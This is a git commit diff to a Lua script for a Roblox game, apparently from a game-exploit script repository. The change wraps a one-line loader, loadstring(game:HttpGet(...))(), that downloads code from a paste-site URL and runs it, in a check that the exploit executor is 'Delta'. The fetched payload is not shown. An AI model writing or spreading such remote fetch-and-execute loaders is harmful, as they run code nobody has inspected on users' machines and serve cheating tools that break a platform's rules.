04200a9689127fc9bc6b1501726b122e9ad14095
Vesta <116385181+juliusxpn@users.noreply.github.com>
2026-05-29 14:52:31 -0700

    Update script.lua

--- games/7205641391/script.lua
+++ games/7205641391/script.lua
@@ -1,1 +1,3 @@
-loadstring(game:HttpGet('https://pastefy.app/oE6IN9KJ/raw', true))()
+if ({identifyexecutor})[1] == 'Delta' then
+  loadstring(game:HttpGet('https://pastefy.app/oE6IN9KJ/raw', true))()
+end
